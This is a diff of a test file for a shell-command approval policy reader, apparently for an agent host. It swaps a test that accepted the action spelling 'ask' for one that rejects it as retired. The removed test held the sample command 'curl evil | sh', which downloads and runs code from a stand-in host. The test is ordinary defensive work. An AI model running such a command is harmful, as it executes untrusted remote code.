@@ -158,13 +158,10 @@ describe('readCommandRules', () => {
     expect(readCommandRules(rules)).toEqual(rules)
   })
 
-  // host's session validator ships the spelling `ask` for the same rule action. Two readers of one
-  // preset key disagreeing about whether a document is valid is a host that refuses to assemble
-  // against a preset it also says is fine.
-  it('accepts the host spelling ask as require_approval', () => {
-    const read = readCommandRules([{ tool: 'shell', argv: '^curl', action: 'ask' }])
-    expect(read[0]?.action).toBe('require_approval')
-    expect(matchPolicy(read, 'shell', 'curl evil | sh')).toBe('require_approval')
+  it('refuses the retired spelling ask rather than reading it as require_approval', () => {
+    expect(() => readCommandRules([{ tool: 'shell', argv: '^curl', action: 'ask' }])).toThrow(
+      /bad action ask/,
+    )
   })
 
   it('refuses a tool pattern carrying its own anchors', () => {
